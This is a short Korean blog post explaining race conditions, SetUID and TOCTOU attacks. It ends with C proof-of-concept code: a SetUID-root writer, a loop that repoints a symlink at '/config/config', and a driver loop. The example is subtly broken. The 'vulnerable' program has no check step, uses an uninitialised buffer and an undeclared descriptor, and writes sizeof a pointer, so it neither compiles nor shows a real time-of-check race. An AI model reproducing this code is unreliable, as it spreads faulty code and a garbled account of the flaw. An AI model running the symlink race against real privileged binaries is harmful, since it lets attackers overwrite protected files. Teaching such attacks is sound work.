---
title: "[System] TOCTOU(Time of Check Time of Use)"
date: 2020-05-07
categories: System
sitemap :
  changefreq : daily
  priority : 1.0
---

---

# Race Condition

 우리 말로 `경쟁 상태`라고 한다. 주로 운영체제에서 두개 이상의 프로세스간 통신(Inter-Process Communication)에서 동일한 공유 자원에 대해서 동시에 접근했을 때 Write나 Read에 대해서 그 결과가 실행된 순서에 의해 결정되는 상태를 말한다. 

---

# SetUID

 `TOCTOU` 공격에서 핵심이 되는 개념중 하나인 **SetUID**는 UNIX 운영체제에서 특정 바이너리에 부여할 수 있는 특수 권한 중 하나로, 4000번대 권한(s)이 걸린 파일을 실행하면 해당 프로세스가 동작하고 있는 동안에는 실행한 주체의 권한을 한시적으로 소유자의 권한으로 변경한다. 그렇기 때문에 `root`가 소유자인 파일을 **SetUID** 설정했을 경우 임의의 사용자에게 관리자 권한을 탈취당할 수 있기 때문에 매우 신중하게 사용해야 한다.

---

# Time of Check Time of Use

앞서 설명한 `Race Condition`을 이용한 공격 중 하나이다. 굉장히 오래된 공격으로 알고 있으며 혹자는 이를 **File Access Race Condtion**이라고 부른다. 왜냐하면 TOCTOU 공격의 기본 원리가 임의의 파일에 대해 Write가 가능하도록 만들기 때문이다. 예시로 제시하는 Proof of Concept의 경우, **SetUID**가 설정 되어있으면서 임의 파일을 open-write 하는 바이너리와 심볼릭 링크를 지속적으로 생성하고 삭제하는 exploit 코드 사이의 경쟁상태를 만든다.

<br/>

```c
// vuln.c

int main() {
    char* buffer;
    
    setreuid(0, 0); // root
    read(0, buffer, 64);
    fd = open("file", O_WRONLY);
    write(fd, buffer, sizeof(buffer));
}
```

```c
// exploit1.c
int main() {
    while(1) {
        unlink("file");
        symlink("/config/config", "file");
    }
}
```

```c
// exploit2.c
int main()
{
    while(1)
    	system("echo \"Very Critical Strings\" | ./vuln");
}
```

```c
~$ ./exploit2 &
~$ ./exploit1 &
```

